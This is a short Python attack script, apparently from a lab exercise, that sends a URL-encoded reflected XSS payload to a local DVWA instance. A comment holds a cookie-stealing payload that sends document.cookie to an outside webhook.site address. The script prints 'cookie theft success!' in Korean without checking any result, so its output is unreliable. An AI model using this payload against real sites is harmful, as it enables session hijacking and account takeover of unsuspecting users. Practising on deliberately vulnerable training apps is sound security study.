import requests
from bs4 import BeautifulSoup
import urllib.parse

def run(xss_target_url, headers, payload):
    encoded_payload = urllib.parse.quote(payload)
    url = "http://192.168.65.2/DVWA/vulnerabilities/xss_r/?name=" + encoded_payload
    # print(url)

    res = requests.get(url=url, headers=headers)
    print("쿠키 탈취 성공!")


    # <script>var i = new Image(); i.src="https://webhook.site/96043fb7-c5a6-4e67-a1f1-74005c14ab06/?cookie="+document.cookie;</script>